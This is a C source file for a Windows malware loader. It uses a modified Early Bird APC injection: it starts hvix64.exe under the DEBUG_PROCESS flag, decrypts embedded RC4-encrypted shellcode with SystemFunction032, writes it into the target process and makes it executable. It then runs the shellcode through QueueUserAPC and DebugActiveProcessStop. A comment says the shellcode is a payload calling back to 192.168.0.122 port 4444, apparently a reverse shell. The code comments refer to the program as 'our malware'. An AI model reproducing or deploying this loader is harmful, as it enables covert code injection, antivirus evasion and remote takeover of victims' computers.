#include <windows.h>
#include <stdio.h>

#pragma warning (disable:4996)

//TARGET_PROCESS will be searched in C:\Windows\system32 because of GetEnvironmentVariableA. If we want other path, we would need to get another path from function
#define TARGET_PROCESS "hvix64.exe"

//Logic - standard Early Bird APC Injection (1):
//1. Create suspended process
//2. Write the payload to the address space of the target
//3. Get the suspended thread's handle from CreateProcess along with the payload's base address and pass them to QueueUserAPC
//4. Resume the thread using the ResumeThread to execute payloads

//Implemented:
//Logic - Modified Early Bird APC Injection (2):
//1. Use CreateProcess with DEBUG_PROCESS flag instead of SUSPENDED (attaching the debugger which is our malware)
//1.5 Decipher the encrypted payload
//2. Inject payload into target process address space
//3. Get the debugged thread's handle from CreateProcess along with the payload's base address and pass them to QueueUserAPC
//4. Detach the target process with DebugActiveProcessStop to stop and remove the debugger and also resume the thread and execute payload

typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // the return of SystemFunction032
    NTSTATUS        STATUS = NULL;

    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

//payload: 192.168.0.122 4444
unsigned char Rc4CipherText[] = {
        0x20, 0x71, 0x4D, 0xC1, 0x72, 0x98, 0xF3, 0xF7, 0xE3, 0xCF, 0xF0, 0x39, 0x4B, 0x55, 0x06, 0xB7,
        0x42, 0xEE, 0xE7, 0x7D, 0x78, 0xD0, 0x4E, 0x2A, 0x76, 0xCB, 0xB1, 0x98, 0x4E, 0xFE, 0x68, 0x82,
        0x84, 0x56, 0x1B, 0x73, 0x95, 0x76, 0x59, 0x4B, 0xA9, 0x25, 0x95, 0xFE, 0x8B, 0x82, 0xC7, 0xE9,
        0x0D, 0xAA, 0x7A, 0x8D, 0x6E, 0x1D, 0xE0, 0xA7, 0x4B, 0x76, 0x70, 0x93, 0x5E, 0x81, 0xF4, 0xA4,
        0x6E, 0x48, 0x8E, 0x7A, 0xB5, 0x60, 0xCB, 0x54, 0x26, 0xC5, 0xD7, 0x69, 0x33, 0x87, 0xCF, 0x8B,
        0xD3, 0xF3, 0xCC, 0xD9, 0x07, 0x75, 0x35, 0xBE, 0xD5, 0x31, 0xA6, 0xB7, 0x6D, 0x5E, 0x55, 0xE1,
        0x33, 0x26, 0x48, 0x92, 0xCD, 0x35, 0x1F, 0x90, 0xFF, 0x0B, 0x6A, 0x05, 0x04, 0x7F, 0xE7, 0x34,
        0xE2, 0xC0, 0x82, 0x49, 0x5B, 0x3B, 0xC7, 0x9F, 0xFC, 0x6F, 0x12, 0x0C, 0xA1, 0xE0, 0x4A, 0x49,
        0x75, 0x54, 0xEA, 0x2E, 0xF8, 0x67, 0x65, 0xBE, 0xEF, 0x16, 0xDE, 0x9B, 0xAA, 0xDC, 0xB4, 0x68,
        0xA3, 0xED, 0x2F, 0x4A, 0x88, 0xA3, 0x68, 0x54, 0x2B, 0x03, 0x3F, 0xE4, 0x4C, 0x22, 0xBF, 0xBC,
        0xB4, 0xD5, 0x6C, 0x20, 0xC9, 0x17, 0x2B, 0x70, 0xEC, 0x3C, 0xD0, 0x5E, 0x9F, 0x6D, 0x6C, 0xF3,
        0x66, 0x44, 0x81, 0x12, 0x0B, 0x1C, 0x2D, 0xF5, 0xB3, 0x6B, 0x52, 0x02, 0x35, 0xF1, 0xBC, 0x48,
        0x41, 0x71, 0xF1, 0xF8, 0xE4, 0x40, 0xB8, 0xF7, 0xD9, 0x27, 0xC4, 0x29, 0x60, 0x10, 0x4B, 0x53,
        0x66, 0x3E, 0xE3, 0xA8, 0xA5, 0xDD, 0x50, 0x88, 0xD5, 0xE9, 0x9E, 0x59, 0x3C, 0xD9, 0x1A, 0xDB,
        0x42, 0x1B, 0x9D, 0xDC, 0x60, 0x77, 0x92, 0x36, 0x7A, 0x9D, 0x80, 0x85, 0x30, 0x70, 0x32, 0xD1,
        0x5B, 0x5D, 0xD9, 0xBF, 0x34, 0xD6, 0xF1, 0x2F, 0xE4, 0x83, 0x5A, 0x50, 0x52, 0x53, 0x72, 0x01,
        0x35, 0x80, 0x1A, 0x41, 0x4B, 0x0F, 0x89, 0x73, 0x09, 0x03, 0x52, 0xED, 0x56, 0x8D, 0xC7, 0x2C,
        0xAA, 0x1F, 0xB5, 0xC2, 0x94, 0x80, 0xA6, 0xEB, 0x33, 0x8A, 0xC2, 0x0A, 0xAC, 0x4A, 0x63, 0x83,
        0x9C, 0x2E, 0xF5, 0xB4, 0x3C, 0x77, 0xD0, 0x00, 0x3F, 0x4F, 0xC8, 0x80, 0x14, 0xB7, 0xDC, 0x5A,
        0x8F, 0x2C, 0xAC, 0x4E, 0xF0, 0x4D, 0x82, 0x0B, 0x74, 0x74, 0x3F, 0x00, 0x0C, 0xAA, 0x26, 0x06,
        0x76, 0x67, 0xF6, 0x5D, 0x91, 0xC5, 0x5E, 0xEF, 0x80, 0xE9, 0x55, 0xF3, 0xFF, 0xF2, 0xE0, 0x38,
        0xB8, 0xB7, 0x65, 0xF5, 0xBF, 0x7E, 0x0F, 0x61, 0xE4, 0xAB, 0x67, 0xAB, 0xF8, 0xAB, 0x9C, 0x9A,
        0x11, 0x0F, 0x0A, 0x28, 0xD1, 0xF1, 0xC8, 0xE6, 0x37, 0xA6, 0x52, 0x83, 0x18, 0x8F, 0xB3, 0x37,
        0x32, 0xDE, 0xB6, 0xC7, 0x7D, 0x11, 0x7D, 0x2B, 0xCE, 0x7C, 0xEA, 0x76, 0xD9, 0x00, 0x9D, 0xF0,
        0xD0, 0xA2, 0xE0, 0x59, 0x55, 0xDB, 0x55, 0x86, 0xA0, 0x44, 0x8A, 0xA2, 0xFA, 0x19, 0x30, 0xE4,
        0xE9, 0xA1, 0xB5, 0xBE, 0x85, 0x1C, 0xFA, 0xE3, 0x7E, 0x39, 0x2C, 0x4F, 0x00, 0x05, 0x7C, 0xB2,
        0xDD, 0x16, 0xBB, 0xDF, 0xAA, 0x15, 0xDC, 0x24, 0xAE, 0x81, 0xE5, 0xDE, 0x0E, 0xCF, 0xF1, 0x95,
        0x32, 0xB4, 0x99, 0xD8, 0x13, 0x14, 0x45, 0x9B, 0x38, 0x89, 0x28, 0x42, 0x7E, 0x4A, 0x6C, 0x89,
        0x3C, 0x7A, 0x85, 0x33, 0xC4, 0xF3, 0x8D, 0x22, 0x69, 0x0C, 0xDE, 0x81 };


unsigned char Rc4Key[] = {
        0x10, 0x27, 0x3B, 0x62, 0x79, 0x82, 0xAA, 0xDA, 0x02, 0x4F, 0x50, 0x05, 0x6A, 0x9C, 0x0F, 0x0F };

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }


    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

    CHAR lpPath [MAX_PATH * 2];
    CHAR WnDr [MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    //Clean the structs
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    //set the size of structure
    Si.cb = sizeof(STARTUPINFO);

    //get the %windir& env var path 
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA failed with error: %d\n", GetLastError());
        return FALSE;
    }

    //create the target process path for CreateProcessA
    //example: if windir is C:\Windows, it will look for TARGET_PROCESS in C:\Windows\system32
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    //printf("\n\t[i] Running: \"%s\"...", lpPath);

    //create the process with DEBUG_PROCESS
    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
        printf("[!] CreateProcessA failed with error: %d", GetLastError());
        return FALSE;
    }

    //fill up the OUTPUT params with CreateProcessA outpuit
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    //checks
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

int main()
{
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;

    //create target remote process in debugged state
    if (!CreateSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        printf("[!] CreateSuspendedProcess2 failed with error: %d\n", GetLastError());
        return -1;
    }

    //decipher the payload
    Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText));

    //inject payload and get the base address
    if (!InjectShellcodeToRemoteProcess(hProcess, Rc4CipherText, sizeof(Rc4CipherText), &pAddress)) {
        printf("[!] InjectShellcodeToRemoteProcess failed with error: %d\n", GetLastError());
        return -1;
    }
    //queue the APC
    QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

    //run payload
    DebugActiveProcessStop(dwProcessId);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}

